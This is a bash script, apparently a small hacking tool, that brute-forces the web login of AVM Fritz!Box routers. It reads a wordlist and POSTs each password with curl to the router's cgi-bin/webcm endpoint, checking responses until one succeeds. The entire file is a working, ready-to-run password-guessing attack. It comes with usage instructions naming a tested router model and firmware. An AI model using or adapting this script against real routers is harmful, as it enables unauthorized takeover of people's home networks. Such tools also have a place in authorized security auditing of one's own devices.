#!/bin/bash  -
# Bruteforce Fritz!Box 
#  Code by brixton brixton [dot] hackermail [dot] com
#
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA#
#

clear
if ! test -e .brutefritz.log
 then
  touch .brutefritz.log
 else 
  echo "" >.brutefritz.log
fi



scan()
{
banner
while read line
 do
   curl -d "login:command/password=$line" \
        -d "getpage=../html/de/menus/menu2.html" \
        -d "errorpage=../html/index.html" \
        -d "var:lang=de" \
        -d "var:pagename=home" \
        -d "var:menu=home" \
        -s http://$1/cgi-bin/webcm | grep Assistenten >.brutefritz.log 
if [ "$(cat .brutefritz.log)" = "" ]
 then echo "+++Password no access ->$line" 
 else echo "+++Password found :)  ->$line"
 exit
fi

 done < $2
}

banner()
{
echo "
        \|||/
        (o o)
,~~~ooO~~(_)~~~~~~~~~,
| briXtons Fritz!Box |
|    Bruteforce      |
|     Version 1      |
|                    |
'~~~~~~~~~~~~~~ooO~~~'
       |__|__|
        || ||
       ooO Ooo
"
}

usage()
{
banner
echo "
$0 -i <ip/url> -w <wordlistfile>
$0 -h this help


example:
$0 -i 192.168.178.1 -w wordlists.lst

testet with FRITZ!Box WLAN 3170 -> Firmware-Version 49.04.58 ->Linux ubuntu 2.6.32-24-generic

"
}

while getopts "w:i:h" Option
 do
	case $Option in
		w) WORDLIST=$OPTARG;;
		i) IP=$OPTARG;; 
                h) usage;exit;;
		*) usage;exit;;
	esac
done

if [ "$IP" = "" ];then echo "no ip or url";exit;fi
if [ -e $WORDLIST ]; then
	scan $IP $WORDLIST
else 
	echo "File $WORDLIST does not exists"
fi 
